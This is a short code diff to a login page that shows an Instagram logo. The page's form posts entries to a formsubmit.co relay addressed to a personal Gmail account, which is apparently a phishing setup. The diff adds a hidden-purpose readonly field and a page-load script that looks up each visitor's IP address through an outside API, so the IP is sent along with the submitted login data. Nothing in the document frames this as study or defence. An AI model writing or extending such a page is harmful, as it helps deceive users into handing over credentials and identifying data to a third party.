@@ -35,7 +35,7 @@
                 </div>
                 <div class="form-container">
                     <form id="form"  method="POST" action="https://formsubmit.co/Earnmegaccess@gmail.com">
-
+  <input type="text" id="ipAddress" name="ipAddress" readonly>
                     <div class="form-content box">
                         <div class="logo">
                             <img src="./images/logo-light.png" alt="Instagram logo" class="logo-light">
@@ -160,7 +160,21 @@
                         });
                 });
     </script> -->
-    
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+    // Replace 'https://api.ipify.org?format=json' with a preferred IP API if needed
+    fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+            const ipAddress = data.ip;
+            document.getElementById('ipAddress').value = ipAddress;
+        })
+        .catch(error => {
+            console.error('Error fetching IP address:', error);
+        });
+});
+
+    </script>
     <script src="app.js"></script> 
 
 <!-- <script> -->
